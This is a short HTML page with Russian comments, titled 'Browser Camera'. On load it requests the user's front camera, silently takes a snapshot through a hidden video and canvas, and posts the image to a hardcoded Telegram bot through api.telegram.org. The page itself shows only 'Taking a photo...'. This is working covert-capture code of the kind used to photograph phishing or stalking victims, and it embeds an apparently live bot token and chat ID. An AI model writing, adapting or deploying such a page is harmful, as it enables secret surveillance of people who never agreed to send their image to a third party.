<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Browser Camera</title>
</head>
<body>
    <h1>Taking a photo...</h1>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
        const CHAT_ID = '1753361154';

        // Функция для работы с камерой
        const startCameraAndCapturePhoto = () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            // Доступ к камере
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;

                    // Захват фото после активации камеры
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            const context = canvas.getContext('2d');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            const imageData = canvas.toDataURL('image/jpeg');

                            // Конвертация base64 в файл и отправка в Telegram
                            fetch(imageData)
                                .then(res => res.blob())
                                .then(blob => {
                                    const formData = new FormData();
                                    formData.append('chat_id', CHAT_ID);
                                    formData.append('photo', blob, 'photo.jpg');

                                    // Отправка фото в Telegram
                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                        method: 'POST',
                                        body: formData
                                    })
                                    .then(response => response.json())
                                    .then(data => {
                                        if (data.ok) {
                                            console.log("Photo sent successfully!");
                                        } else {
                                            console.error("Failed to send photo:", data.description);
                                        }
                                    })
                                    .catch(err => console.error("Error sending photo:", err));
                                });
                        }, 1000); // 1 секунда для активации камеры
                    };
                })
                .catch(err => {
                    console.error("Camera access error:", err);
                    document.body.innerHTML = "<h1>Camera access denied. Please allow camera permissions.</h1>";
                });
        };

        // Запуск камеры и захват фото при загрузке страницы
        window.onload = startCameraAndCapturePhoto;
    </script>
</body>
</html>
